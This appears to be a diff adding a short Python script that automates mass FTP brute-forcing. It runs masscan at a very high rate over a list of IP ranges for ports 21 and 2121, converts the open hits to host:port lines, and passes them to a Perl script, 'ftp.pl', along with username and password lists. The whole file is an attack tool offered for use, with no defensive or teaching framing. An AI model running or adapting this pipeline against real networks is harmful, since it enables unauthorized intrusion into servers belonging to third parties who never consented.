@@ -1,0 +1,33 @@
+#coding:utf-8
+import os
+import time
+
+os.system('masscan -iL rangeIP -p21,2121 --exclude 255.255.255.255 -oL masscan.txt --rate=500000')
+while True:
+    if os.path.exists("masscan.txt"):
+        break
+    else:
+        time.sleep(1)
+if os.path.getsize("masscan.txt") == 0:
+    print("No open ports")
+    exit()
+else :
+    print("MasscanConvert is running...")
+    masscanfile = open("masscan.txt", "r")
+    masscanfile.seek(0)
+    for line in masscanfile:
+        if line.startswith("#"):
+            continue
+        if line.startswith("open"):
+            line = line.split(" ")
+            with open("masscanconvert.txt", "a") as f:
+                f.write(line[3]+":"+line[2]+"\n")
+                f.close()
+    masscanfile.close()
+if os.path.exists("masscan.txt"):
+    os.system('perl ftp.pl masscanconvert.txt users.txt passwords.txt')
+    os.remove("masscan.txt")
+    print("FTP is done!")
+else:
+    print("masscan.txt")
+    exit()
